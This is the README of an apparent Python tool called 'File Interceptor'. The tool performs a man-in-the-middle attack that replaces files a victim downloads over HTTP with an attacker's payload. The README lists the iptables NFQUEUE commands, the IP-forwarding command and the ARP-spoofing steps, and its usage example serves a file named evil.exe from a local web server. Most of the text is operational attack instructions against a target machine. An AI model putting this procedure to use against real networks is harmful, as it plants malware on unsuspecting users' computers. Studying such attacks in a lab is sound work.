## Program Requirements

* Linux-based Operating System (Kali, Parrot or Arch)
* Python 3
* A target machine (Tested in Windows Server)
* A network connection (wired or wireless) for the machines
* iptables setup before using the program
```
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE
```

## Module Requirements

* [argparse](https://docs.python.org/3/library/argparse.html?highlight=argparse): The argparse module makes it easy to write user-friendly command-line interfaces.
* [NetfilterQueue ](https://pypi.org/project/NetfilterQueue/): NetfilterQueue provides access to packets matched by an iptables rule in Linux. Packets so matched can be accepted, dropped, altered, reordered, or given a mark.
* [scapy](https://scapy.readthedocs.io/en/latest/): Scapy is a Python program that enables the user to send, sniff, dissect and forge network packets. This capability allows construction of tools that can probe, scan or attack networks.

## Output

A continuous output of HTTP requests and responses. The target HTTP File should change according to your payload.
This can be stopped by a keyboard interruption CTRL+C.

* Stop the ARP Spoofer after use.
* Flush iptables after use.
```
iptables --flush
```

## Process

1. Setup the webserver of your payload (E.g. service apache2 start)
2. Setup iptables. (iptables -I FORWARD -j NFQUEUE)
3. Start the ARP Spoofer
4. Enable Packet Forwarding of the MITM (echo 1 > /proc/sys/net/ipv4/ip_forward)
5. Start the File Interceptor.
5. From the target, open browser and access an HTTP website. (E.g. http://www.speedbit.com/)
6. Download the file. The file should be replaced with your payload

## Usage

```
usage: File Interceptor [-h] -e EXT -p PAYLOAD

Intercepts Payload via MITM.

options:
  -h, --help            show this help message and exit
  -e EXT, --extension EXT
                        Extension of the expected payload (E.g. .exe, .rar, .zip)
  -p PAYLOAD, --payload PAYLOAD
                        Payload file Absolute Path (E.g. http://192.168.1.6/evil.exe
                        https://www.7-zip.org/a/7z2301-x64.exe)
```

## References

* [ChatGPT](https://chat.openai.com/): an AI designed to understand, learn, and help with various tasks and inquiries.
* [Jason Sohl](https://www.jasonsohl.com/netfilterqueue-on-parrotos/): NetfilterQueue on ParrotOS
* [Stack Overflow](https://stackoverflow.com/questions/61098923/typeerror-argument-payload-has-incorrect-type-expected-bytes-got-str-how): TypeError: Argument 'payload' has incorrect type (expected bytes, got str). How can I fix it? Why it works on Python 2 but not using Python 3?
* [Stack Overflow](https://stackoverflow.com/questions/22130342/scapy-attributeerror-on-every-call-module-object-has-no-attribute): Scapy AttributeError on every call: 'module' object has no attribute '*'